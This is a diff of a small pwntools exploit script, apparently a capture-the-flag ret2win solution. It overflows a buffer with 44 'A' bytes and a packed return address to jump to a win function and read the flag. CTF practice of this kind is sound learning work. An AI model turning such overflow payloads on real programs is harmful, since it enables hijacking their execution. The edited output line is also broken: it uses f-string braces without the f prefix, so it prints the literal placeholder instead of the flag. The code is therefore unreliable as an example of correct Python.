@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 from pwn import *
 
 #context.log_level = 'DEBUG'
@@ -12,4 +14,5 @@ p.recvuntil('> ')
 p.sendline('A' * 44 + p32(ret2win_addr))
 
 p.recvuntil('flag:')
-print "Flag:", p.recv(1024)
+
+log.info("Flag: {p.recv(1024).decode()}")
